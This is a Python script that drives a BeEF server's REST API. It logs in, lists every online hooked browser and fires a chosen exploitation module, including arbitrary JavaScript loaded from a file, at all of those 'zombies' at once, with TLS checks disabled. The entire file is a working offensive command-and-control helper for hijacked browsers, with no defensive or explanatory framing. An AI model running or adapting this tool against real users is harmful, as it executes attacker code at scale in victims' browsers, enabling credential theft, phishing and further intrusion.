import argparse
import requests
import json
import sys
import urllib3

# disable SSL warnings when using proxy
urllib3.disable_warnings()

# create an ArgumentParser object
parser = argparse.ArgumentParser(description='Interact with BeEF\'s API via commandline. Run modules on all browser sessions at the same time.')

# add arguments
parser.add_argument('-u', '--username', type=str, help='Username to connect to BeEF.')
parser.add_argument('-p', '--password', type=str, help='Password for user.')
parser.add_argument('--url', type=str, help='URL to reach BeEF, e.g. https://example.com')
parser.add_argument('-m', '--module', type=str, help='Name of module to execute. Module name for each module is found in modules/module/config.yaml in BeEF')
parser.add_argument('-mp', '--moduleparams', type=str, help='Additional parameters for the module. should be passeed as -p "key1=value1,key2=value2" Leave blank if not needed.')


# parse the arguments
args = parser.parse_args()

ascii_art = '''
 ▄████▄   ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ██▓    ▓█████   ██████ ▄▄▄█████▓ ▒█████   ██▀███   ███▄ ▄███▓
▒██▀ ▀█  ▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▓██▒    ▓█   ▀ ▒██    ▒ ▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒▓██▒▀█▀ ██▒
▒▓█    ▄ ▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██░    ▒███   ░ ▓██▄   ▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒▓██    ▓██░
▒▓▓▄ ▄██▒░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ▒██░    ▒▓█  ▄   ▒   ██▒░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  ▒██    ▒██ 
▒ ▓███▀ ░ ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░ ░██████▒░▒████▒▒██████▒▒  ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒▒██▒   ░██▒
░ ░▒ ▒  ░ ▒▒   ▓▒█░ ▒ ░░     ▒ ░░   ░ ▒░▓  ░░░ ▒░ ░▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ▒░   ░  ░
  ░  ▒     ▒   ▒▒ ░   ░        ░    ░ ░ ▒  ░ ░ ░  ░░ ░▒  ░ ░    ░      ░ ▒ ▒░   ░▒ ░ ▒░░  ░      ░
░          ░   ▒    ░        ░        ░ ░      ░   ░  ░  ░    ░      ░ ░ ░ ▒    ░░   ░ ░      ░   
░ ░            ░  ░                     ░  ░   ░  ░      ░               ░ ░     ░            ░   
░                                                                                                 
'''

# constants
HEADERS = {
    "Content-Type": "application/json"
}

PROXIES={}
#PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"} # uncomment to proxy through burp for debugging

def fetch_token(username, password, beef_api_url):
    # Authenticate with the BeEF API to fetch the token
    auth_response = requests.post(beef_api_url + "/admin/login", json={
        "username": username,
        "password": password
    }, proxies=PROXIES, verify=False, headers=HEADERS)

    auth_token = json.loads(auth_response.content)["token"]

    return auth_token

def find_module(module, beef_api_url, auth_token):
    # default
    module_id = 0

    # fetch all modules
    modules_response = requests.get(beef_api_url + "/modules" + "?token=" + auth_token, proxies=PROXIES, verify=False, headers=HEADERS)
    modules = modules_response.json()

    # check if match
    match = False
    for mod in modules.values():
        if str(mod["id"]) == module:
            match = True
            module_id = str(mod["id"])
        elif mod["class"] == module:
            match = True
            module_id = str(mod["id"])
        elif mod["name"] == module:
            match = True
            module_id = str(mod["id"])

    if match == False:
        module_id = -1

    return module_id

def fetch_hooked_browsers(beef_api_url, auth_token):
    # Fetch the hooked browser IDs from the BeEF API
    hooks_response = requests.get(beef_api_url + "/hooks" + "?token=" + auth_token, proxies=PROXIES, verify=False, headers=HEADERS)
    hooked_browsers = hooks_response.json()

    return hooked_browsers["hooked-browsers"]["online"].values()

def run_module(module_id, hooked_browsers, params, beef_api_url, auth_token):
    # Run module against hooked browser sessions
    for browser in hooked_browsers:
        requests.post(beef_api_url + "/modules/" + browser["session"] + "/" + module_id + "?token=" + auth_token, json=params, proxies=PROXIES, verify=False, headers=HEADERS)

def main():
    print(ascii_art)

    if not args.username:
        print("[!] Error: username is not set.")
        sys.exit()
    if not args.password:
        print("[!] Error: password is not set.")
        sys.exit()
    if not args.url:
        print("[!] Error: URL is not set.")
        sys.exit()
    if not args.module:
        print("[!] Error: No module given.")
        sys.exit()

    # Set the BeEF API endpoint URL
    beef_api_url = args.url + "/api"

    print("[+] Feching token...")

    # get the token
    auth_token = fetch_token(args.username, args.password, beef_api_url)

    print("[+] Checking module validity...")

    # Attempt to find the correct module based on name / class / id given
    module_id = find_module(str(args.module), beef_api_url, auth_token)
    if module_id == -1:
        print("[!] Error: module not found. Try again with module name, class name or module ID. Make sure to double quote strings with spaces.")
        sys.exit()

    # prepare parameters if set
    params = {}
    if args.moduleparams is not None:
        for param in args.moduleparams.split(","):
            params[param.split("=")[0]] = param.split("=")[1]

    ##### SPECIAL MODULE HANDLING #####
    # If Raw JavaScript module as name is requested, load javascript content from file (passed as cmd parameter)
    if args.module == "Raw JavaScript":
        with open(params["cmd"], 'r') as file:
            params["cmd"] = file.read()

    print("[+] Fetching hooked browsers...")

    # fetch a list of hooked browsers
    hooked_browsers = fetch_hooked_browsers(beef_api_url, auth_token)

    print("[+] Executing on all zombies...")

    # Run the module on every browser
    run_module(module_id, hooked_browsers, params, beef_api_url, auth_token)

    print("[+] Execution finished.")

if __name__ == "__main__":
    main()
